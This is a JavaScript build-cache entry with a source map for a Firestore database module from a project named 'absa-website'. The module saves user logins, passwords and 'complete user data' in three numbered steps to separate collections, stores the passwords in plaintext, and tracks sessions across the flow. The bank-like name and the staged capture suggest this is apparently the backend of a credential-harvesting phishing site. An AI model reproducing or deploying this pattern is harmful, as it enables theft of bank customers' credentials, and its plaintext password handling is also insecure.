{"ast":null,"code":"import { collection, addDoc, getDocs, doc, updateDoc, setDoc } from 'firebase/firestore';\nimport { db } from './firebase';\n\n// Add data to a collection\nexport const addData = async (collectionName, data) => {\n  try {\n    const docRef = await addDoc(collection(db, collectionName), data);\n    return docRef.id;\n  } catch (error) {\n    console.error('Error adding data:', error);\n    throw error;\n  }\n};\n\n// Get all data from a collection\nexport const getData = async collectionName => {\n  try {\n    const querySnapshot = await getDocs(collection(db, collectionName));\n    return querySnapshot.docs.map(doc => ({\n      id: doc.id,\n      ...doc.data()\n    }));\n  } catch (error) {\n    console.error('Error getting data:', error);\n    throw error;\n  }\n};\n\n// Save user login data (Step 1)\nexport const saveUserLogin = async loginData => {\n  try {\n    const userData = {\n      ...loginData,\n      step: 1,\n      createdAt: new Date().toISOString(),\n      updatedAt: new Date().toISOString()\n    };\n    const docRef = await addDoc(collection(db, 'user_logins'), userData);\n    console.log('Login data saved with ID:', docRef.id);\n    return docRef.id;\n  } catch (error) {\n    console.error('Error saving login data:', error);\n    throw error;\n  }\n};\n\n// Save user password data (Step 2)\nexport const saveUserPassword = async passwordData => {\n  try {\n    const userData = {\n      ...passwordData,\n      step: 2,\n      updatedAt: new Date().toISOString()\n    };\n    const docRef = await addDoc(collection(db, 'user_passwords'), userData);\n    console.log('Password data saved with ID:', docRef.id);\n    return docRef.id;\n  } catch (error) {\n    console.error('Error saving password data:', error);\n    throw error;\n  }\n};\n\n// Save complete user data (Step 3 - Final)\nexport const saveCompleteUserData = async completeData => {\n  try {\n    const userData = {\n      ...completeData,\n      step: 3,\n      completedAt: new Date().toISOString(),\n      updatedAt: new Date().toISOString(),\n      status: 'completed'\n    };\n    const docRef = await addDoc(collection(db, 'complete_user_data'), userData);\n    console.log('Complete user data saved with ID:', docRef.id);\n    return docRef.id;\n  } catch (error) {\n    console.error('Error saving complete user data:', error);\n    throw error;\n  }\n};\n\n// Save user session data (for tracking the entire flow)\nexport const saveUserSession = async sessionData => {\n  try {\n    const session = {\n      ...sessionData,\n      sessionId: sessionData.sessionId || Date.now().toString(),\n      createdAt: new Date().toISOString(),\n      updatedAt: new Date().toISOString()\n    };\n    const docRef = await addDoc(collection(db, 'user_sessions'), session);\n    console.log('User session saved with ID:', docRef.id);\n    return docRef.id;\n  } catch (error) {\n    console.error('Error saving user session:', error);\n    throw error;\n  }\n};","map":{"version":3,"names":["collection","addDoc","getDocs","doc","updateDoc","setDoc","db","addData","collectionName","data","docRef","id","error","console","getData","querySnapshot","docs","map","saveUserLogin","loginData","userData","step","createdAt","Date","toISOString","updatedAt","log","saveUserPassword","passwordData","saveCompleteUserData","completeData","completedAt","status","saveUserSession","sessionData","session","sessionId","now","toString"],"sources":["/Users/mcebisimanqele/absa-website/src/database.js"],"sourcesContent":["import { collection, addDoc, getDocs, doc, updateDoc, setDoc } from 'firebase/firestore';\nimport { db } from './firebase';\n\n// Add data to a collection\nexport const addData = async (collectionName, data) => {\n  try {\n    const docRef = await addDoc(collection(db, collectionName), data);\n    return docRef.id;\n  } catch (error) {\n    console.error('Error adding data:', error);\n    throw error;\n  }\n};\n\n// Get all data from a collection\nexport const getData = async (collectionName) => {\n  try {\n    const querySnapshot = await getDocs(collection(db, collectionName));\n    return querySnapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));\n  } catch (error) {\n    console.error('Error getting data:', error);\n    throw error;\n  }\n};\n\n// Save user login data (Step 1)\nexport const saveUserLogin = async (loginData) => {\n  try {\n    const userData = {\n      ...loginData,\n      step: 1,\n      createdAt: new Date().toISOString(),\n      updatedAt: new Date().toISOString()\n    };\n    \n    const docRef = await addDoc(collection(db, 'user_logins'), userData);\n    console.log('Login data saved with ID:', docRef.id);\n    return docRef.id;\n  } catch (error) {\n    console.error('Error saving login data:', error);\n    throw error;\n  }\n};\n\n// Save user password data (Step 2)\nexport const saveUserPassword = async (passwordData) => {\n  try {\n    const userData = {\n      ...passwordData,\n      step: 2,\n      updatedAt: new Date().toISOString()\n    };\n    \n    const docRef = await addDoc(collection(db, 'user_passwords'), userData);\n    console.log('Password data saved with ID:', docRef.id);\n    return docRef.id;\n  } catch (error) {\n    console.error('Error saving password data:', error);\n    throw error;\n  }\n};\n\n// Save complete user data (Step 3 - Final)\nexport const saveCompleteUserData = async (completeData) => {\n  try {\n    const userData = {\n      ...completeData,\n      step: 3,\n      completedAt: new Date().toISOString(),\n      updatedAt: new Date().toISOString(),\n      status: 'completed'\n    };\n    \n    const docRef = await addDoc(collection(db, 'complete_user_data'), userData);\n    console.log('Complete user data saved with ID:', docRef.id);\n    return docRef.id;\n  } catch (error) {\n    console.error('Error saving complete user data:', error);\n    throw error;\n  }\n};\n\n// Save user session data (for tracking the entire flow)\nexport const saveUserSession = async (sessionData) => {\n  try {\n    const session = {\n      ...sessionData,\n      sessionId: sessionData.sessionId || Date.now().toString(),\n      createdAt: new Date().toISOString(),\n      updatedAt: new Date().toISOString()\n    };\n    \n    const docRef = await addDoc(collection(db, 'user_sessions'), session);\n    console.log('User session saved with ID:', docRef.id);\n    return docRef.id;\n  } catch (error) {\n    console.error('Error saving user session:', error);\n    throw error;\n  }\n};"],"mappings":"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","ignoreList":[]},"metadata":{},"sourceType":"module","externalDependencies":[]}